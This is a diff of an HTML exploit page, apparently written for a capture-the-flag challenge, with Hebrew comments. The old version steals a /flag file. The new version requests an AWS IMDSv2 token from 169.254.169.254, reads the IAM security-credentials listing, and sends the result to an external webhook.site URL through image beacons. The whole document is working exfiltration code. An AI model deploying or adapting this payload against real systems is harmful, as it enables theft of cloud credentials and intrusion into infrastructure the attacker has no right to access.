@@ -2,23 +2,45 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>CTF Exploit Payload</title>
+  <title>IMDSv2 CTF Exploit</title>
 </head>
 <body>
-  <h1>Running Exploit1...</h1>
+  <h1>Running IMDSv2 Exploit...</h1>
   <script>
-    // הודעה שהקוד רץ
-    new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?ping=1';
+    // URL של ה-webhook שלך
+    const webhookURL = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d';
 
-    // ניסיון לגנוב את הדגל
-    fetch('/flag')
-      .then(response => response.text())
-      .then(flagText => {
-        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?flag=' + encodeURIComponent(flagText);
+    // בקשה לקבלת טוקן ל-IMDSv2
+    fetch('http://169.254.169.254/latest/api/token', {
+      method: 'PUT',
+      headers: {
+        'X-aws-ec2-metadata-token-ttl-seconds': '21600'
+      }
+    })
+    .then(response => {
+      if (!response.ok) throw new Error('Failed to get token');
+      return response.text();
+    })
+    .then(token => {
+      // השתמש בטוקן כדי לבקש מידע מה-metadata
+      return fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
+        headers: {
+          'X-aws-ec2-metadata-token': token
+        }
       })
-      .catch(() => {
-        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?error=failed-to-get-flag';
+      .then(res => {
+        if (!res.ok) throw new Error('Failed to get metadata');
+        return res.text();
+      })
+      .then(data => {
+        // שלח את המידע ל-webhook שלך
+        new Image().src = webhookURL + '?data=' + encodeURIComponent(data);
       });
+    })
+    .catch(error => {
+      // במקרה של שגיאה - שלח את ההודעה ל-webhook
+      new Image().src = webhookURL + '?error=' + encodeURIComponent(error.message);
+    });
   </script>
 </body>
 </html>
